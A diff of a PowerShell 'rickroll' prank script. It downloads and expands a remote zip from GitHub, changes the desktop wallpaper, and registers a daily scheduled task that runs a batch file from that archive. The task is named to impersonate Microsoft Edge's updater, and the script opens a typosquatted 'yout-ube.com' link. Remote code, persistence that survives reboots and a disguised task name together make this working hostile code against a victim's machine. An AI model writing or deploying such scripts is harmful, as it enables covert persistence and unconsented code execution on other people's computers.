@@ -1,15 +1,10 @@
 mkdir C:\temp
    
-$filename = "C:\temp\rick.zip"
-
-#If the file does not exist, create it.
-if (-not(Test-Path -Path $filename -PathType Leaf)) {
-   Invoke-WebRequest 'https://github.com/CHONK12/rickRoll/archive/refs/heads/main.zip' -OutFile C:\temp\rick.zip
-   Expand-Archive C:\temp\rick.zip .\rick
+Invoke-WebRequest 'https://github.com/CHONK12/rickRoll/archive/refs/heads/main.zip' -OutFile C:\temp\rick.zip
+Expand-Archive C:\temp\rick.zip .\rick
    
-}
 
-$MyWallpaper="C:\temp\rickroll.jpg"
+$MyWallpaper="C:\temp\rick\rickroll.jpg"
 $code = @'
 using System.Runtime.InteropServices;
 namespace Win32{
@@ -31,7 +26,7 @@ namespace Win32{
 
 add-type $code
 [Win32.Wallpaper]::SetWallpaper($MyWallpaper)
-$action = New-ScheduledTaskAction -Execute 'C:\temp\lobster.bat'  
+$action = New-ScheduledTaskAction -Execute 'C:\temp\rick\lobster.bat'  
 $trigger = New-ScheduledTaskTrigger -Daily -At 3pm
 Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "MicrosoftEdgeUpdateTaskMachineCore{32533}" -Description "Ear death"
 Start-Process msedge https://www.yout-ube.com/watch?v=dQw4w9WgXcQ
